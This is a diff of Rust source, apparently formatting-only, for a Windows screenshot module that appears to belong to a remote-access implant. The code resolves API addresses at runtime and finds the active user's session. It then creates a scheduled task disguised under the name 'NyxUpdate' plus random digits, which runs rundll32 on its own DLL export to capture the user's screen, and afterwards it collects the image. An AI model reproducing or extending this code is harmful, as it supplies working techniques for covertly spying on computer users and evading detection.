@@ -367,14 +367,16 @@ unsafe fn attach_interactive() -> Option<WinstaGuard> {
         Some(a) => a,
         None => return None,
     };
-    let gpws = match unsafe { crate::resolve::export_addr(b"user32.dll", b"GetProcessWindowStation") } {
-        Some(a) => a,
-        None => return None,
-    };
-    let spws = match unsafe { crate::resolve::export_addr(b"user32.dll", b"SetProcessWindowStation") } {
-        Some(a) => a,
-        None => return None,
-    };
+    let gpws =
+        match unsafe { crate::resolve::export_addr(b"user32.dll", b"GetProcessWindowStation") } {
+            Some(a) => a,
+            None => return None,
+        };
+    let spws =
+        match unsafe { crate::resolve::export_addr(b"user32.dll", b"SetProcessWindowStation") } {
+            Some(a) => a,
+            None => return None,
+        };
     let odk = match unsafe { crate::resolve::export_addr(b"user32.dll", b"OpenDesktopW") } {
         Some(a) => a,
         None => return None,
@@ -601,7 +603,14 @@ pub unsafe fn count_displays() -> u32 {
     // this stack frame for the duration of the EnumDisplayMonitors call (which
     // is synchronous — all callbacks fire before it returns).
     let ldata = &counter as *const _ as isize;
-    let _ = unsafe { edm(core::ptr::null_mut(), core::ptr::null(), count_callback, ldata) };
+    let _ = unsafe {
+        edm(
+            core::ptr::null_mut(),
+            core::ptr::null(),
+            count_callback,
+            ldata,
+        )
+    };
     counter.get()
 }
 
@@ -697,8 +706,17 @@ fn capture_bmp_gdi(dpi_aware: bool) -> Option<(Vec<u8>, bool)> {
 /// original closure did, as raw addresses (each stage helper transmutes the
 /// ones it calls). `None` if any is missing — the caller unwinds with the
 /// station/desktop already detached.
-fn capture_bmp_resolve(
-) -> Option<(usize, usize, usize, usize, usize, usize, usize, usize, usize)> {
+fn capture_bmp_resolve() -> Option<(
+    usize,
+    usize,
+    usize,
+    usize,
+    usize,
+    usize,
+    usize,
+    usize,
+    usize,
+)> {
     let gsm = match unsafe { export_addr(b"user32.dll", b"GetSystemMetrics") } {
         Some(a) => a,
         None => return None,
@@ -796,7 +814,9 @@ fn capture_bmp_pixels(
 ) -> Option<Vec<u8>> {
     let (sdc, mdc) = capture_bmp_dcs(gdc, rdc, ccdc)?;
     let (bmp, ppv_bits) = capture_bmp_dib(cds, ddc, rdc, sdc, mdc, bi)?;
-    let (prev, ppv_bits) = capture_bmp_blt(so, bb, do_, ddc, rdc, mdc, sdc, bmp, ppv_bits, w, h, vsx, vsy)?;
+    let (prev, ppv_bits) = capture_bmp_blt(
+        so, bb, do_, ddc, rdc, mdc, sdc, bmp, ppv_bits, w, h, vsx, vsy,
+    )?;
     capture_bmp_copy(so, do_, ddc, rdc, sdc, mdc, bmp, prev, ppv_bits, bytes)
 }
 
@@ -856,7 +876,16 @@ fn capture_bmp_dib(
     // CreateDIBSection allocates the DIB at EXACTLY bi_width × bi_height
     // (× 4 bytes/pixel at 32 bpp), regardless of the DC's DPI awareness
     // state. This is the fix for the size bug — see the function doc.
-    let bmp = unsafe { cds(sdc, bi, DIB_RGB_COLORS, &mut ppv_bits, core::ptr::null_mut(), 0) };
+    let bmp = unsafe {
+        cds(
+            sdc,
+            bi,
+            DIB_RGB_COLORS,
+            &mut ppv_bits,
+            core::ptr::null_mut(),
+            0,
+        )
+    };
     if bmp.is_null() || ppv_bits.is_null() {
         unsafe { ddc(mdc) };
         unsafe { rdc(core::ptr::null_mut(), sdc) };
@@ -885,7 +914,17 @@ fn capture_bmp_blt(
     vsy: i32,
 ) -> Option<(*mut c_void, *mut c_void)> {
     type SelectObject = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
-    type BitBlt = unsafe extern "system" fn(*mut c_void, i32, i32, i32, i32, *mut c_void, i32, i32, u32) -> i32;
+    type BitBlt = unsafe extern "system" fn(
+        *mut c_void,
+        i32,
+        i32,
+        i32,
+        i32,
+        *mut c_void,
+        i32,
+        i32,
+        u32,
+    ) -> i32;
     type DeleteObject = unsafe extern "system" fn(*mut c_void) -> i32;
     type DeleteDc = unsafe extern "system" fn(*mut c_void) -> i32;
     type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
@@ -895,7 +934,20 @@ fn capture_bmp_blt(
     let ddc: DeleteDc = unsafe { core::mem::transmute(ddc) };
     let rdc: ReleaseDc = unsafe { core::mem::transmute(rdc) };
     let prev = unsafe { so(mdc, bmp) };
-    if unsafe { bb(mdc, 0, 0, w as i32, h as i32, sdc, vsx, vsy, SRCCOPY | CAPTUREBLT) } == 0 {
+    if unsafe {
+        bb(
+            mdc,
+            0,
+            0,
+            w as i32,
+            h as i32,
+            sdc,
+            vsx,
+            vsy,
+            SRCCOPY | CAPTUREBLT,
+        )
+    } == 0
+    {
         unsafe { so(mdc, prev) };
         unsafe { do_(bmp) };
         unsafe { ddc(mdc) };
@@ -1048,13 +1100,8 @@ unsafe fn write_all_to_file_open(cf: usize, path: &[u8]) -> Option<*mut c_void> 
 /// # Safety
 /// Transmutes the resolved WriteFile address and calls it on `h`/`data`.
 unsafe fn write_all_to_file_write(h: *mut c_void, wf: usize, data: &[u8]) -> bool {
-    type WriteFile = unsafe extern "system" fn(
-        *mut c_void,
-        *const u8,
-        u32,
-        *mut u32,
-        *const c_void,
-    ) -> i32;
+    type WriteFile =
+        unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *const c_void) -> i32;
     let wf: WriteFile = unsafe { core::mem::transmute(wf) };
     let mut off = 0usize;
     let mut ok = true;
@@ -1148,7 +1195,8 @@ fn dpi_probe_diag_num(s: &mut Vec<u8>, v: i64) {
 pub unsafe fn capture_to_file(path: &[u8]) -> bool {
     let bmp = match capture_bmp() {
         Some((b, _dpi_aware)) => b,
-        None => return false,    };
+        None => return false,
+    };
     unsafe { write_all_to_file(path, &bmp) }
 }
 
@@ -1236,15 +1284,20 @@ unsafe fn find_active_session() -> Option<u32> {
     let lla: unsafe extern "system" fn(*const u8) -> *mut c_void =
         unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"LoadLibraryA")?) };
     if unsafe { lla(b"wtsapi32.dll\0".as_ptr()) }.is_null() {
-        unsafe { XSESS_FAIL = 2; }
+        unsafe {
+            XSESS_FAIL = 2;
+        }
         return None;
     }
-    type WTSEnumerateSessionsW = unsafe extern "system" fn(
-        *mut c_void, u32, u32, *mut *mut u8, *mut u32,
-    ) -> i32;
+    type WTSEnumerateSessionsW =
+        unsafe extern "system" fn(*mut c_void, u32, u32, *mut *mut u8, *mut u32) -> i32;
     type WTSFreeMemory = unsafe extern "system" fn(*mut c_void);
     #[repr(C)]
-    struct WtsSessionInfo { session_id: u32, win_station: *const u8, state: u32 }
+    struct WtsSessionInfo {
+        session_id: u32,
+        win_station: *const u8,
+        state: u32,
+    }
     let enum_sessions: WTSEnumerateSessionsW =
         unsafe { core::mem::transmute(export_addr(b"wtsapi32.dll", b"WTSEnumerateSessionsW")?) };
     let free_mem: WTSFreeMemory =
@@ -1254,7 +1307,9 @@ unsafe fn find_active_session() -> Option<u32> {
     if unsafe { enum_sessions(core::ptr::null_mut(), 0, 1, &mut buf, &mut count) } == 0
         || buf.is_null()
     {
-        unsafe { XSESS_FAIL = 1; }
+        unsafe {
+            XSESS_FAIL = 1;
+        }
         return None;
     }
     let sessions =
@@ -1263,20 +1318,25 @@ unsafe fn find_active_session() -> Option<u32> {
     unsafe { free_mem(buf as *mut c_void) };
     match active_sid {
         Some(s) => Some(s),
-        None => { unsafe { XSESS_FAIL = 1; } None }
+        None => {
+            unsafe {
+                XSESS_FAIL = 1;
+            }
+            None
+        }
     }
 }
 
 /// Query the active session's user and domain names via WTSQuerySessionInformationW.
 /// Returns the schtasks /ru principal string: "DOMAIN\\user" or bare "user".
 unsafe fn query_session_user(sid: u32) -> crate::heap::Vec<u16> {
-    type WTSQuerySessionInfoW = unsafe extern "system" fn(
-        *mut c_void, u32, u32, *mut *mut u16, *mut u32,
-    ) -> i32;
-    let query_si_addr = match unsafe { export_addr(b"wtsapi32.dll", b"WTSQuerySessionInformationW") } {
-        Some(a) => a,
-        None => return crate::heap::Vec::new(),
-    };
+    type WTSQuerySessionInfoW =
+        unsafe extern "system" fn(*mut c_void, u32, u32, *mut *mut u16, *mut u32) -> i32;
+    let query_si_addr =
+        match unsafe { export_addr(b"wtsapi32.dll", b"WTSQuerySessionInformationW") } {
+            Some(a) => a,
+            None => return crate::heap::Vec::new(),
+        };
     let query_si: WTSQuerySessionInfoW = unsafe { core::mem::transmute(query_si_addr) };
     let free_mem_addr = match unsafe { export_addr(b"wtsapi32.dll", b"WTSFreeMemory") } {
         Some(a) => a,
@@ -1293,7 +1353,9 @@ unsafe fn query_session_user(sid: u32) -> crate::heap::Vec<u16> {
         {
             let slice = unsafe { core::slice::from_raw_parts(p, (bytes as usize) / 2) };
             out.extend_from_slice(slice);
-            while out.last() == Some(&0) { out.pop(); }
+            while out.last() == Some(&0) {
+                out.pop();
+            }
             unsafe { free_mem(p as *mut c_void) };
         }
         out
@@ -1335,20 +1397,21 @@ unsafe fn resolve_dll_path() -> crate::heap::Vec<u16> {
         }
     }
     let mut dpath: crate::heap::Vec<u16> = crate::heap::Vec::new();
-    for &b in canonical { dpath.push(b as u16); }
+    for &b in canonical {
+        dpath.push(b as u16);
+    }
     dpath
 }
 
 /// Create a one-shot scheduled task that runs the screenshot helper in the
 /// active session, trigger it, and poll for the BMP result.
 /// Returns the BMP bytes on success, or None with XSESS_FAIL set.
-unsafe fn run_screenshot_task(
-    runas: &[u16],
-    dpath: &[u16],
-) -> Option<Vec<u8>> {
+unsafe fn run_screenshot_task(runas: &[u16], dpath: &[u16]) -> Option<Vec<u8>> {
     // Build task name: NyxUpdate + random 1000-9999 suffix.
     let mut task_name: crate::heap::Vec<u16> = crate::heap::Vec::with_capacity(24);
-    for &by in b"NyxUpdate" { task_name.push(by as u16); }
+    for &by in b"NyxUpdate" {
+        task_name.push(by as u16);
+    }
     let gtc: unsafe extern "system" fn() -> u32 =
         unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"GetTickCount")?) };
     let seed = unsafe { gtc() };
@@ -1356,9 +1419,13 @@ unsafe fn run_screenshot_task(
 
     // Build helper command: rundll32 <dll>,nyx_screenshot_session.
     let mut helper_cmd: crate::heap::Vec<u16> = crate::heap::Vec::with_capacity(80 + dpath.len());
-    for &by in b"C:\\Windows\\System32\\rundll32.exe " { helper_cmd.push(by as u16); }
+    for &by in b"C:\\Windows\\System32\\rundll32.exe " {
+        helper_cmd.push(by as u16);
+    }
     cmd_extend_wide(&mut helper_cmd, dpath);
-    for &by in b",nyx_screenshot_session" { helper_cmd.push(by as u16); }
+    for &by in b",nyx_screenshot_session" {
+        helper_cmd.push(by as u16);
+    }
 
     // Create + trigger the one-shot task, then poll for the BMP result.
     if !unsafe { run_screenshot_task_schedule(&task_name, &helper_cmd, runas) } {
@@ -1377,30 +1444,46 @@ unsafe fn run_screenshot_task_schedule(
 ) -> bool {
     // Build schtasks /create command.
     let mut create_cmd = crate::heap::Vec::<u16>::with_capacity(160 + helper_cmd.len());
-    for &by in b"schtasks /create /tn " { create_cmd.push(by as u16); }
+    for &by in b"schtasks /create /tn " {
+        create_cmd.push(by as u16);
+    }
     create_cmd.extend_from_slice(task_name);
-    for &by in b" /tr \"" { create_cmd.push(by as u16); }
+    for &by in b" /tr \"" {
+        create_cmd.push(by as u16);
+    }
     create_cmd.extend_from_slice(helper_cmd);
-    for &by in b"\" /sc once /st 23:59 /it" { create_cmd.push(by as u16); }
+    for &by in b"\" /sc once /st 23:59 /it" {
+        create_cmd.push(by as u16);
+    }
     if !runas.is_empty() {
-        for &by in b" /ru \"" { create_cmd.push(by as u16); }
+        for &by in b" /ru \"" {
+            create_cmd.push(by as u16);
+        }
         create_cmd.extend_from_slice(runas);
         create_cmd.push(b'"' as u16);
     }
-    for &by in b" /f\0" { create_cmd.push(by as u16); }
+    for &by in b" /f\0" {
+        create_cmd.push(by as u16);
+    }
     if !unsafe { run_cmd_wait(create_cmd.as_mut_ptr()) } {
-        unsafe { XSESS_FAIL = 5; }
+        unsafe {
+            XSESS_FAIL = 5;
+        }
         let _ = unsafe { delete_task(task_name) };
         return false;
     }
 
     // Trigger the task.
     let mut run_cmd = crate::heap::Vec::<u16>::with_capacity(64 + task_name.len());
-    for &by in b"schtasks /run /tn " { run_cmd.push(by as u16); }
+    for &by in b"schtasks /run /tn " {
+        run_cmd.push(by as u16);
+    }
     run_cmd.extend_from_slice(task_name);
     run_cmd.push(0);
     if !unsafe { run_cmd_wait(run_cmd.as_mut_ptr()) } {
-        unsafe { XSESS_FAIL = 5; }
+        unsafe {
+            XSESS_FAIL = 5;
+        }
         let _ = unsafe { delete_task(task_name) };
         return false;
     }
@@ -1426,7 +1509,9 @@ unsafe fn run_screenshot_task_poll(task_name: &[u16]) -> Option<Vec<u8>> {
         Some(b) => Some(b),
         None => {
             let _ = del_file(SHOT_TEMP);
-            unsafe { XSESS_FAIL = 7; }
+            unsafe {
+                XSESS_FAIL = 7;
+            }
             None
         }
     }
@@ -1437,7 +1522,9 @@ unsafe fn run_screenshot_task_poll(task_name: &[u16]) -> Option<Vec<u8>> {
 unsafe fn cross_session_capture() -> Option<Vec<u8>> {
     // Default: export resolution failed (step 8). Explicit failure points
     // overwrite this.
-    unsafe { XSESS_FAIL = 8; }
+    unsafe {
+        XSESS_FAIL = 8;
+    }
 
     // 1. Find an active interactive session (RDP or console).
     let sid = match find_active_session() {
@@ -1706,13 +1793,8 @@ unsafe fn read_file_open(cf: usize, path: &[u8]) -> Option<*mut c_void> {
 /// Transmutes the resolved ReadFile/CloseHandle addresses and calls them on
 /// the open handle.
 unsafe fn read_file_read(rf: usize, ch: usize, h: *mut c_void) -> Option<Vec<u8>> {
-    type ReadFile = unsafe extern "system" fn(
-        *mut c_void,
-        *mut u8,
-        u32,
-        *mut u32,
-        *const c_void,
-    ) -> i32;
+    type ReadFile =
+        unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32, *const c_void) -> i32;
     type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
     let rf: ReadFile = unsafe { core::mem::transmute(rf) };
     let ch: CloseHandle = unsafe { core::mem::transmute(ch) };
